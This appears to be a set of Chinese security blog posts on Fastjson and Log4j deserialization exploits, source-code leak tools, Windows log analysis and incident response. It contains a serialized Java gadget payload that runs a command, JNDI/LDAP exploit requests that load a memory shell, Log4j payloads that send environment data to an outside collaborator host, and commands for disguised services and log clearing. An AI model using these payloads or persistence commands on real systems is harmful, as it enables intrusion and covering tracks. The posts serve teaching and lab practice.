AB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000069ECAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723236353230383636373133363630300100204C79736F73657269616C2F50776E65723236353230383636373133363630303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178;\u0026#34; } } 5.4.Fastjson\u0026lt;= 1.2.67版本利用 前提：FastJson版本小于1.2.67并且目标存在Shiro环境，在有shiro的情况下（不限制版本），需要开启autotype，可以通杀\n还是使用JNDI-Injection-Exploit ，开启ldap来打内存马\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /json HTTP/1.1 Host: 192.168.165.252:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=FB191FA4A87502B1D47A0EF7BFEEDCB2 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/json Content-Length: 187 { \u0026#34;@type\u0026#34;: \u0026#34;org.apache.shiro.jndi.JndiObjectFactory\u0026#34;, \u0026#34;resourceName\u0026#34;: \u0026#34;ldap://192.168.165.252:1389/TomcatBypass/GodzillaMemshell\u0026#34;, \u0026#34;instance\u0026#34;: { \u0026#34;$ref\u0026#34;: \u0026#34;$.instance\u0026#34; } } 5.5.FastJson\u0026lt;=1.2.68版本利用 这个大版本下，可以使用jdbc反序列化简单粗暴通杀\n**可反序列化版本：**5.1.11-5.1.48，6.0.2-6.0.3，8.0.19\n可ssrf版本：5.0.2-5.1.5，5.1.1-5.1.49，\u0026gt;8.0.19\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.30\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试比较通用的方法：利用Character转换报错，探测版本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST /json HTTP/1.1 Host: 192.168.0.105:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/json Content-Length: 117 { \u0026#34;x\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Character\u0026#34;{ \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.mysql.jdbc.Buffer\u0026#34; }} 探测别的版本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 org.springframework.web.bind.annotation.RequestMapping //SpringBoot org.apache.catalina.startup.Tomcat //Tomcat groovy.lang.GroovyShell //Groovy - 1.2.80 com.mchange.v2.c3p0.DataSources //C3P0 com.mysql.jdbc.Buffer //mysql-jdbc-5 com.mysql.cj.api.authentication.AuthenticationProvider //mysql-connect-6 com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8 sun.nio.cs.GBK //JDK8 java.net.http.HttpClient //JDK11 org.apache.ibatis.type.Alias //Mybatis org.apache.tomcat.dbcp.dbcp.BasicDataSource //tomcat-dbcp-7-BCEL org.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8及以后-BCEL org.apache.commons.io.Charsets // 存在commons-io,但不确定版本 org.apache.commons.io.file.Counters //commons-io-2.7-2.8 org.aspectj.ajde.Ajde //aspectjtools 5.6.不出网利用 利用BCEL不出网打内存马\n利用BCEL打fastjson直接burp回显getshell_fastjson回显-CSDN博客\n7.悟空CRM-FastJson反序列化漏洞 错误解决——搭建悟空crm9项目运行环境过程中遇到的一些问题和错误解决办法_悟空crm审核报网络错误-CSDN博客\n8.FastjsonExploit https://github.com/c0ny1/FastjsonExploit\nFastjsonExploit ‌是一个专门针对 Fastjson库 的安全漏洞进行检测和利用的工具，由 c0ny1 开发。该工具的主要功能包括一键生成利用payload、管理Fastjson的各种payload、模拟攻击者的行为进行安全测试等‌\n1 2 3 java -jar FastjsonExploit-[version].jar [payload] [option] [command] java -jar FastjsonExploit-[version].jar JdbcRowSetImpl1 rmi://127.0.0.1:1099/Exploit \u0026#34;cmd:calc\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 D:\\Java_Project\\JavaSec\\Fastjson\\FastjsonExploit-master\\target\u0026gt;java -jar FastjsonExploit-0.1-beta2-all.jar .---- -. -. . . . ( .\u0026#39;,----- - - \u0026#39; \u0026#39; \\_/ ;--:-\\ __--------------------__ __U__n_^_\u0026#39;\u0026#39;__[. |ooo___ | |_!_||_!_||_!_||_!_| | c(_ ..(_ ..(_ ..( /,,,,,,] | |___||___||___||___| | ,_\\___________\u0026#39;_|,L______],|______________________| /;_(@)(@)==(@)(@) (o)(o) (o)^(o)--(o)^(o) FastjsonExploit is a Fastjson library vulnerability exploit framework Author:c0ny1\u0026lt;root@gv7.me\u0026gt; Usage: java -jar Fastjson-[version]-all.jar [payload] [option] [command] Exp01: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl1 rmi://127.0.0.1:1099/Exploit \u0026#34;cmd:calc\u0026#34; Exp02: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl1 ldap://127.0.0.1:1232/Exploit \u0026#34;code:custom_code.java\u0026#34; Exp03: java -jar FastjsonExploit-[version].jar TemplatesImpl1 \u0026#34;cmd:calc\u0026#34; Exp04: java -jar FastjsonExploit-[version].jar TemplatesImpl1 \u0026#34;code:custom_code.java\u0026#34; Available payload types: Payload PayloadType VulVersion Dependencies ------- ----------- ---------- ------------ BasicDataSource1 local 1.2.2.1-1.2.2.4 tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4 BasicDataSource2 local 1.2.2.1-1.2.2.4 tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4 JdbcRowSetImpl1 jndi 1.2.2.1-1.2.2.4 JdbcRowSetImpl2 jndi 1.2.2.1-1.2.4.1 Fastjson 1.2.41 bypass JdbcRowSetImpl3 jndi 1.2.2.1-1.2.4.3 Fastjson 1.2.43 bypass JdbcRowSetImpl4 jndi 1.2.2.1-1.2.4.2 Fastjson 1.2.42 bypass JdbcRowSetImpl5 jndi 1.2.2.1-1.2.4.7 Fastjson 1.2.47 bypass JndiDataSourceFactory1 jndi 1.2.2.1-1.2.2.4 ibatis-core:3.0 SimpleJndiBeanFactory1 jndi 1.2.2.2-1.2.2.4 spring-context:4.3.7.RELEASE TemplatesImpl1 local 1.2.2.1-1.2.2.4 xalan:2.7.2(need Feature.SupportNonPublicField) TemplatesImpl2 local 1.2.2.1-1.2.2.4 xalan:2.7.2(need Feature.SupportNonPublicField) ","date":"2025-08-15T16:50:57+08:00","image":"https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo_hu_a7abc88d4c991a5b.jpg","permalink":"https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Fastjson反序列化"},{"content":"1.Log4j框架介绍 Log4j 是一个广泛使用的 Java 日志框架，由 Apache 软件基金会开发，用于记录应用程序的运行日志。它允许开发者以灵活的方式控制日志的输出格式、级别、存储位置等，是 Java 生态中最流行的日志工具之一。\n2.Log4j反序列化原理 log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。\n攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）。\nJava反序列化漏洞 | log4j2远程代码执行漏洞原理+漏洞复现\n受影响版本：Apache Log4j 2.x \u0026lt;= 2.14.1\n资产测绘：app=\u0026quot;Log4j2\u0026quot;\n3.漏洞复现CVE-2021-44228 Log4j2漏洞深度剖析与防御指南\n4.漏洞分析 庖丁解牛：log4j2 RCE的源码调试分析\n5.实战案例 5.1.Tmall商城管理系统Log4j漏洞分析 查看pom.xml依赖文件，发现使用了log4j框架\n版本为2.10.0，是受影响版本，全局搜索logger.info，看是否存在可控变量\n跟踪函数，找到路由和对应的功能点，发现是头像上传处\n根据路由找到对应功能点，上传文件抓包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST /tmall/admin/uploadAdminHeadImage HTTP/1.1 Host: 192.168.165.252:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----geckoformboundary5ffa03aac35f42dbd80775bfd3061ca Content-Length: 35456 Origin: http://192.168.165.252:8081 Connection: close Referer: http://192.168.165.252:8081/tmall/admin Cookie: username=admin; JSESSIONID=F5F2F20085366DA17CE26838F1C9795F; username=admin; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=2B27F7FE2A85DCB3143450BE147DE450 ------geckoformboundary5ffa03aac35f42dbd80775bfd3061ca Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;11.png\u0026#34; Content-Type: image/png ���� 将filename字段替换为payload：${jndi:ldap://x20gkpye1u8z0uai60gru2x80z6quhi6.oastify.com}\n此时接收到DNS请求\n1 2 ${jndi:ldap://${env.OS}.1ikk0teihyo3gyqmm4wva6dcg3mvanyc.oastify.com} ${jndi:ldap://${sys:java.version}.1ikk0teihyo3gyqmm4wva6dcg3mvanyc.oastify.com} ","date":"2025-08-15T16:41:21+08:00","image":"https://lserein.github.io/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/log4j_hu_6093ed73d7d2c3a.jpg","permalink":"https://lserein.github.io/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Log4j反序列化"},{"content":"1.git源码泄露 1 git源码泄露有源码泄露还有日志泄露 git泄露（一篇文章就够了）-CSDN博客\n1.1.CTF-Hub Git log信息泄露 目录扫描，发现存在.git泄露\n如果运行时报错\n按提示执行这个命令：git config \u0026ndash;global init.defaultBranch\n1 2 git config --global init.defaultBranch git log //查看提交历史 1.直接使用git show查看最近一次提交（仅适用于修改数据量较小时使用）\n2.使用git diff比较不同版本的差异（推荐）\n1 2 git diff commit1 commit2 git diff 62a06bc17a444943221427e24b873a868769f636 8680523ff38c06e3407f519a6ffddc79d4b34a93 3.使用git回滚，将版本回退至删除flag之前的版本\n1 git reset --hard \u0026lt;commit\u0026gt; 这时版本会回到刚刚增加flag的版本，打开获取网站的文件夹会发现新增了一个文本文件，打开就是flag\n1.2.以CTFHUB的web-git泄露-stash为例 1 2 3 4 5 使用GitHack无法获取Flag git show / git log git stash list git stash pop 使用git stash list查看暂存的代码，然后使用git stash pop将代码从暂存堆栈中拉去出来\n使用Git_Extract工具，这个是自动解析不用git stash等操作，直接得到flag\nhttps://github.com/gakki429/Git_Extract\n1 python2 git_extract.py http://challenge-a1b2543fac4ab8fb.sandbox.ctfhub.com:10800/.git/ 2.SWP源码泄露 CTFHub技能树-备份文件下载-vim缓存_ctfhub vim缓存-CSDN博客\n1 wget challenge-801aa09cb1ad910e.sandbox.ctfhub.com:10800/.index.php.swp -p /Desktop 3.SVN源码泄露 SVN源码泄露利用原理+实战_seay svn-CSDN博客\n1 2 3 4 5 关于svn利用分两个版本一个版本是svn\u0026gt;1.6，还有一个是svn\u0026lt;1.6 svn\u0026gt;1.6,文件名会被hash，然后再按照文件名对应hash的方式存到wc.db中,就是个sqlite数据库。最后我们按照名称遍历下载即可。 svn\u0026lt;1.6,文件会先去读取entries文件的中的目录结构,因为默认文件名都是直接明文存的。 使用dirsearch扫描目录发现存在SVN源码泄露\n直接打开下载的数据库文件\n使用SVNExploit进行利用\nhttps://github.com/admintony/svnExploit\n1 python SvnExploit.py -u http://challenge-e49be4310b567375.sandbox.ctfhub.com:10800/.svn --dump https://github.com/kost/dvcs-ripper\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 git clone https://github.com/kost/dvcs-ripper.git sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl # 安装依赖 ./rip-svn.pl -v -u http://challenge-3791c896116904b4.sandbox.ctfhub.com:10800/.svn/ cd .svn hhj@tux:~/dvcs-ripper/.svn$ tree . ├── entries ├── format ├── pristine │ ├── 64 │ │ └── 64f6f2d33c84cc20c4946c17234cb1f36efb1779.svn-base │ └── bf │ └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base ├── text-base ├── tmp └── wc.db 4.hg源码泄露 使用dirsearch，发现存在.hg泄露\n下载https://github.com/kost/dvcs-ripper\n1 ./rip-hg.pl -v -u http://challenge-fe23aeae94eb0a0f.sandbox.ctfhub.com:10800/.hg 1 2 访问 http://challenge-fe23aeae94eb0a0f.sandbox.ctfhub.com:10800/flag_2218424738.txt 5.DS_Store源码泄露 DS_Store源码泄露文件是由 macOS 生成的隐藏文件，当它们暴露在 Web 服务器上时，可能会无意中泄露敏感的目录信息。\nhttps://github.com/lijiejie/ds_store_exp\n1 python ds_store_exp.py https://cezeri.test.com/.DS_Store 6.压缩文件源码泄露 使用目录扫描工具进行扫描即可，可以构造一些不常见字典（域名/IP/包括类名等等）\n1 2 3 4 5 www.rar www.zip www.xxx.com.zip 127.0.0.1.zip com.user.controller.zip .... ","date":"2025-08-14T20:54:29+08:00","image":"https://lserein.github.io/p/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98/image/1_hu_74efc219c36fc223.png","permalink":"https://lserein.github.io/p/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98/","title":"常见源码泄露问题"},{"content":"2. Windows系统日志审计详解\n1.事件日志分析 使用eventvwr.msc打开事件查看器\n1.1.事件日志类型 应用程序日志 应用程序日志包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。\n默认存放路径：C:\\Windows\\System32\\Winevt\\Logs\\Application.evtx\n系统日志 系统日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等\n默认存放路径：C:\\Windows\\System32\\Winevt\\Logs\\System.evtx\n安全日志 安全日志记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。\n默认存放路径：C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx\nWindows Defind日志 如果Windows Defind查杀了某些工具，那么也会记录在日志中\n默认存放路径：C:\\Windows\\System32\\Winevt\\Logs\\Microsoft-Windows-Windows Defender%4Operational.evtx\n1.2.常见事件ID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 事件ID\t说明\t备注 1074\t计算机开机、关机、重启的时间、原因、注释\t查看异常关机情况 1102\t清理审计日志\t发现篡改事件日志的用户 4624\t登录成功\t检测异常的未经授权的登录 4625\t登陆失败\t检测可能的暴力密码攻击 4632\t成员已添加到启用安全性的本地组\t检测滥用授权用户行为 4634\t注销用户\t4648\t试图使用显式凭据登录\t4657\t注册表值被修改\t4663\t尝试访问对象\t检测未经授权访问文件和文件夹的行为。CTF有些时候常考 4672\tadministrator超级管理员登录（被赋予特权）\t4698\t计划任务已创建\t4699\t计划任务已删除\t4700\t启用计划任务\t4701\t禁用计划任务\t4702\t更新计划任务\t4720\t创建用户\t4726\t删除用户\t4728\t成员已添加到启用安全性的全局组\t确保添加安全组成员的资格信息 4740\t锁定用户账户\t检测可能的暴力密码攻击 4756\t成员已添加到启用安全性的通用组\t6005\t表示日志服务已经启动（表明系统正常启动了）\t查看系统启动情况 6006\t表示日志服务已经停止（如果在某天没看到6006事件，说明出现关机异常事件了）\t查看异常关机情况 6009\t非正常关机（ctrl+alt+delete关机）\t5156/5158 出入站日志（很重要） 1.2.1.5156/5158出入站日志 当内网一台主机对你发起请求时，如Ping扫描就会记录在日志中，日志编号为5156\n1.2.2.1102日志清除记录 在windows中，若运维人员开启了记录所有安全日志项，那么攻击者在拿到该服务器权限后的所有操作都可以在该安全日志中被记录到。所以清空该Security日志肯定是一个善后的必然选择。\n1 通过cmd清除日志：wevtutil cl \u0026#34;Security\u0026#34; 在该日志事件中，执行日志清除动作的是system权限的账户，这肯定是有问题的。因为正常情况下普通用户是没有权限去清除日志的，除非绕过了UAC的普通账户，又或者是system权限的账户。\n1.2.3.4720/4726账户管理记录 在安全日志4720中可以查看攻击者创建的用户，即使是隐藏用户都可以查看到。4726则是可以查看到被删除的用户。该事件日志中还可以查看该任务的发起者。\n1 net user 用户名 密码 /add SAM事件ID-4656：那么同样的若权限不足，则该事件也会被记录下来，但是需要注意的是该事件不会是4720，而是事件4656。因为只有对SAM有更改权限才能够对用户进行创建，无论是创建成功还是失败都会触发SAM的请求句柄事件，事件ID都为4656。\n1.2.4.4732/4733安全组管理记录 在安全日志4732中可以查看攻击者将创建的用户加入到了哪个用户组中，4733则是查看用户从哪个组中移除了。\n1 net localgroup 组名 用户名 /add 1.2.5.计划任务事件ID-4698、4699、4700、4701、4702 在该事件记录信息中，计划任务schtasks以及at都会被记录在内：包括创建者、任务名称、任务内容等。4698 计划任务已创建、4699 计划任务已删除、4700 计划任务已启用、4701 计划任务已停用、4702 计划任务已更。\n1.2.6.进程创建及终止记录4688/4689 要记录该日志，需要编辑完毕本地审计策略后重启计算机，重启后便可以记录每一个被启动的进程日志，包括软件进程。那么可以根据是否有运行WINWORD.EXE来判断某个时间点用户是否有打开word进程，举一反三。\n2.CTF中常见Windows日志分析题 2.1.蓝桥杯\u0026mdash;EZevtx 在安全日志中，查找事件 ID 为 4663 的条目，该事件表示“尝试访问对象”。\n1 flag{confidenal.docx} 2.2.软件系统安全赛 小梁的域控机器被黑客攻击了，请你找出一些蛛丝马迹。 攻击者在获取域管理员权限后，尝试上传木马文件，但是被杀毒软件查杀，上传的木马文件的绝对路径是什么？（如C:\\Windows\\cmd.exe）\n要查找被查杀的木马文件的话，可以通过找相关查杀软件的日志或者查看 Windows 的事件记录。\n在 Windows\\System32\\winevt\\Logs 文件夹找到 Windows Defender 的事件记录文件：Microsoft-Windows-Windows Defender%4Operational.evtx`，然后查看其中内容，很容易在最近的一条事件中找到对应的木马文件：\n1 事件ID：1116 ","date":"2025-06-27T00:43:44+08:00","image":"https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2_hu_f42db3fdb0d7dc5.png","permalink":"https://lserein.github.io/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"Windows日志分析"},{"content":"1.应急响应基本原则 1.1.及时止损\u0026amp;防止扩散 及时止损：对内拔网线，对外封IP\n对于已经失陷的主机来说，如果主机是核心业务服务器，不适合拔网线，只能在防火墙上对IP进行封禁\n1.2.保留现场环境与客户沟通 事前沟通，明确信息，什么类型的应急（APT，勒索，挖矿，后门，DDOS），什么主机（主机所处环境），有什么异常特征\n1. Windows入侵排查\n应急响应就是要站在攻击者的角度进行排查，攻击者拿到一台主机会如何攻击，一般都是先信息收集\u0026mdash;\u0026gt;提权\u0026mdash;\u0026gt;维权\u0026mdash;\u0026gt;横向，那么我们应急响应的思路也应该是按照攻击者的思路来进行应急\n2.主机信息收集 2.1.基础信息收集 1 msinfo32 //查看服务器的系统信息 主要看软件环境：环境变量/启动项/网络连接/服务等等情况\n2.2.网络信息收集 排查是否有恶意外联IP地址，将可疑的IP地址批量放到微步社区查询，重点关注云主机IP\n1 2 netstat -ano netstat -rn //查看路由表 根据PID查找文件对应位置\n1 2 wmic process where processid=28284 get ExecutablePath (Powershell) Get-Process -Id 28284 | Select-Object Path 2.3.进程信息排查 1 2 3 4 5 tasklist /svc //查看进程 tasklist /svc |findstr 17716 //查看pid对应的进程信息 taskkill /f /pid 17716 //杀掉进程 任务管理器 1 2 wmic process get commandline /value //查看所有进程详细信息 wmic process where processid=17260 get commandline /value //查看pid为17260的详细信息 2.4.时间线排查 文件落地时间，服务启动时间（在这台主机没有重启的情况下），也可以看文件创建时间，木马查杀时间，网络流量与日志记录的日志时间推测一个大概的时间\n确定入侵时间线是很重要的,使用evertthing根据入侵事件确定目录下修改或创建的exe文件\n1 C:\\Users\\24767\\Desktop datemodified:2025/06/25..2025/06/26 ext:exe 3.后门排查 3.1.恶意用户排查 隐藏用户/克隆用户\n1 2 3 4 5 6 wmic useraccount get Name /value //一条命令就够了 wmic useraccount get * /value net user krbtgt /add //最危险的地方就是最安全的地方，krbtgt是域内的票据账号 查看注册表 3.2.启动项排查 什么是启动项：注册表下的RUN子键(regedit)/服务启动项(Services.msc)/本地组策略启动项(gpedit.msc)/计划任务\n注册表启动项 1 2 3 regedit 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 所有用户登录都会触发 3.3.服务项分析排查 创建服务首先需要高权限用户才能创建\n1 2 3 4 命令是用于在 Windows 中创建一个名为 WindowsDefind 的服务，其可执行文件位于桌面， 显示名称模仿了 Windows Defender，并设置为开机自动启动s。 sc create WindowsDefind binpath=\u0026#34;C:\\Users\\Administrator\\Desktop\\WindowsDefind.exe\u0026#34; displayname=\u0026#34;Micrsoft Windows Defind\u0026#34; depend=tcpip start=auto 此时使用services.msc可以查看到具体的服务信息，但是没有描述\n1 sc description WindowsDefind \u0026#34;Windows Defender 高级威胁防护服务通过监视和报告计算机上发生的安全事件来防范高级威胁。\u0026#34; 这谁能知道这个服务是恶意服务呢\n1 sc start WindowsDefind //启动服务 那么该如何排查呢？\n先找恶意文件\u0026mdash;在去看是否创建恶意服务\n找的恶意文件的名称，去注册表中去搜索对应的名称\n此时就可以搜索到恶意文件路径和服务名称\n3.4.计划任务排查 1 2 3 schtasks /create /tn \u0026#34;Mirage\u0026#34; /tr \u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34; /sc minute /mo 1 //创建计划任务 schtasks /query /tn \u0026#34;Mirage\u0026#34; /v /fo:list //查找名称为test的计划任务并格式化输出 使用图形化界面搜索计划任务\n4.Windows应急响应工具 4.1.火绒安全分析工具 ","date":"2025-06-26T23:55:19+08:00","image":"https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/logo_hu_91a1d203b72f19e6.png","permalink":"https://lserein.github.io/p/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%96%B9%E6%B3%95%E8%AE%BA/","title":"Windows应急响应方法论"},{"content":"靶机介绍 背景：完全仿真了某学校长期未运营维护的程序，被黑客发现了漏洞，但好在学校有全流量设备，抓取到了过程中的流量包，需要你进行上机以及结合流量分析，排查攻击者利用的漏洞以及上传利用成功的木马，以及清除掉攻击者上传的挖矿程序以及后门程序，挖矿环境完全还原了真实环境，但不会出网，比较有意义，清除做了check操作，你只需要按照相关题目引导进行清除，在指定目录下查看flag提交即可，流量包在远程登录成功后/hacker2025.pcap(玄机直接以附件形式下载)\n流量中被攻击机IP：192.168.77.32\nSSH远程端口：2222 账号密码：root/edusec123\nWEB端口为：19999你需要访问和流量进行还原攻击者路径，在注册账号登录成功后，下载首页的应急响应报告模板进行复现描述攻击过程以及加固流程，非常具有学习意义\n环境地址：夸克网盘离线安装\n[https://pan.quark.cn/s/9fde155741d6](https://pan.quark.cn/s/9fde155741d6()\n解题思路 使用工具分析共有多少IP存在扫描web特征，提交其数量 1 2 //通过scp下载流量包到本地 scp -P 2222 root@192.168.77.32:/hacker2025.pcap ./ 通过分析流量包受害主机IP为192.168.37.11，并且是Web扫描特征\n1 2 3 4 5 6 ip.addr == 192.168.37.11 